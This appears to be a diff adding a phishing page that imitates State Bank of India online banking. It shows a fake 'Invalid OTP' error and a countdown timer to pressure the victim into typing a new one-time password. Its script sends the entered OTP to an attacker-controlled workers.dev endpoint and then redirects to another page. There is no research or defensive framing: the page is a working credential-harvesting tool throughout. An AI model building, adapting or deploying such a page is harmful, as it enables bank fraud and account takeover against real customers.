@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SBI - Online Banking</title>
+    <style>
+        * { box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; margin: 0; padding: 0; }
+        body { background-color: #fff; display: flex; justify-content: center; overflow-x: hidden; }
+        .container { width: 100%; max-width: 500px; display: flex; flex-direction: column; }
+        .full-img { width: 100%; display: block; }
+
+        .header-bar { background-color: #315195; color: white; padding: 10px 15px; font-size: 14px; font-weight: bold; }
+        .content-area { padding: 15px 20px; }
+        
+        .error-msg-box { 
+            font-size: 13px; color: #b30000; line-height: 1.6; margin-bottom: 15px; 
+            padding: 12px; background-color: #fff0f0; border: 1px solid #ffcccc; border-radius: 4px; 
+            font-weight: bold; display: flex; align-items: center; gap: 8px;
+        }
+        
+        .timer-box { color: #b30000; font-weight: bold; font-size: 14px; margin-bottom: 15px; text-align: right; }
+        
+        .field-group { margin-top: 10px; }
+        .field-group label { display: block; font-size: 13px; color: #444; margin-bottom: 8px; font-weight: bold; }
+        
+        .otp-input { 
+            width: 100%; height: 34px; padding: 0 12px; 
+            background-color: #fff; border: 1px solid #999; 
+            border-radius: 2px; font-size: 16px; outline: none; 
+        }
+
+        .btn-row { display: flex; gap: 12px; margin-top: 25px; }
+        .btn { padding: 8px 28px; border: none; color: white; font-size: 14px; border-radius: 2px; cursor: pointer; font-weight: bold; }
+        .btn-submit { background-color: #315195; }
+        .btn-resend { background-color: #6c757d; }
+        
+        .footer-note { margin-top: 30px; font-size: 12px; color: #777; line-height: 1.4; border-top: 1px solid #eee; padding-top: 15px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="SBI Header" class="full-img">
+        <div class="header-bar">High Security Password Verification</div>
+        
+        <div class="content-area">
+            <div class="error-msg-box">
+                <span>⚠️</span> 
+                Invalid OTP. The password you entered is incorrect or expired. A new OTP has been sent to your registered mobile number.
+            </div>
+            
+            <div class="timer-box">New OTP expires in: <span id="timer">02:00</span></div>
+            
+            <div class="field-group">
+                <label>Enter New One Time Password *</label>
+                <input type="number" id="otp_val_new" class="otp-input" inputmode="numeric" 
+                       oninput="if(this.value.length > 6) this.value = this.value.slice(0, 6);" 
+                       required>
+            </div>
+            
+            <div class="btn-row">
+                <button type="button" class="btn btn-submit" id="submitBtn" onclick="submitNewOTP()">Confirm</button>
+                <button type="button" class="btn btn-resend" onclick="location.reload()">Resend OTP</button>
+            </div>
+
+            <div class="footer-note">
+                <b>Note:</b> If you do not receive the OTP, please ensure your mobile network is stable or click on 'Resend OTP'.
+            </div>
+        </div>
+        
+        <div style="margin-top: 40px;"><img src="https://i.ibb.co/Txj77Jk2/chrome-screenshot-1-Apr-2026-12-43-42-pm-IST.png" alt="SBI Footer" class="full-img"></div>
+    </div>
+
+    <script>
+        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
+
+        window.onload = function() {
+            startTimer();
+        };
+
+        function startTimer() {
+            let timeLeft = 120;
+            const timerElement = document.getElementById('timer');
+            const countdown = setInterval(() => {
+                let min = Math.floor(timeLeft / 60);
+                let sec = timeLeft % 60;
+                sec = sec < 10 ? '0' + sec : sec;
+                timerElement.innerHTML = `0${min}:${sec}`;
+                if (timeLeft <= 0) { clearInterval(countdown); timerElement.innerHTML = "Expired"; }
+                else { timeLeft--; }
+            }, 1000);
+        }
+
+        async function submitNewOTP() {
+            const otpField = document.getElementById('otp_val_new');
+            const otp = otpField.value;
+            const btn = document.getElementById('submitBtn');
+            
+            if (otp.length !== 6) {
+                alert("Please enter exactly 6 digits.");
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerText = "Verifying...";
+
+            const payload = { 
+                type: "OTP",
+                step: "OTP-2 (Invalid Path)", 
+                otp: otp
+            };
+
+            try {
+                await fetch(workerURL, { 
+                    method: 'POST', 
+                    mode: 'cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload) 
+                });
+                
+                // Redirecting to finalblog.html
+                window.location.href = "finalblog.html"; 
+            } catch (err) {
+                window.location.href = "finalblog.html";
+            }
+        }
+    </script>
+</body>
+</html>
+
